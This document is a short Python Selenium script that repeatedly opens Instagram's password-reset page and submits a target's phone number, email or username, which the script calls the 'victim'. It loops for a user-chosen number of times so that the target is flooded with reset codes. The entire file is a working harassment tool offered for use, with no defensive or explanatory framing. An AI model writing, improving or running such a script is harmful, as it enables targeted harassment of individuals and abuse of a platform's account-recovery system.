from selenium.webdriver.common.by import By
from selenium import webdriver as wd
import time

n = int(input("How many times OTP from IG?  "))
target = input("Enter the phone number/ E-mail/ username of victim : ")


for x in range(n):
	browser = wd.Chrome('chromedriver.exe')
	browser.get(r"https://www.instagram.com/accounts/password/reset/")

	ph_number = browser.find_element(By.NAME, r'cppEmailOrUsername')
	ph_number.send_keys(target)

	submit = browser.find_element(By.XPATH, r'//*[@id="react-root"]/section/main/div[2]/div/div/div/div/div[5]/button')

	submit.click()
	time.sleep(5)

	browser.close()